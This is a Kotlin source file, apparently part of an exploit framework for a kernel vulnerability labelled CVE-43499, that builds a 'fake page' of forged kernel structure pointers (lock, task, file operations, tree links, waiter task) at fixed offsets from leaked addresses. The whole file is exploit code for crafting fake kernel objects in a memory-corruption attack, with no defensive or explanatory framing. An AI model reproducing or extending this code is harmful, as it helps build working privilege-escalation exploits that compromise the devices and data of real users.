package com.ghostlock.app.backend.cve43499.ktstep.run

import com.ghostlock.app.engine.ktstep.NativePrepareResult

/**
 * FakePage values for the legacy select/TCP routes, derived from prepare facts.
 * The page base follows the N3 convention: prepared.base - 0xE80.
 */
object Cve43499FakePage {
    private const val LOCK_OFF = 0x0E80L
    private const val FOPS_OFF = 0x0F80L
    private const val TASK_OFF = 0x1280L

    fun fromPrepared(
        facts: NativePrepareResult.Ok,
        initTask: Long = 0L,
        rightOverride: Long = 0L,
    ): LongArray {
        val page = facts.base - LOCK_OFF
        require(page != 0L) { "page base is zero" }
        return longArrayOf(
            page,                    // base
            page + LOCK_OFF,         // fake_lock
            0L,                      // fake_w0
            page + TASK_OFF,         // fake_task
            0L,                      // fake_parent
            if (rightOverride != 0L) rightOverride else page + 0x100L, // fake_right
            0L,                      // fake_left
            page + FOPS_OFF,         // fake_fops
            initTask,                // waiter_task
            0L,                      // task_group
        )
    }
}
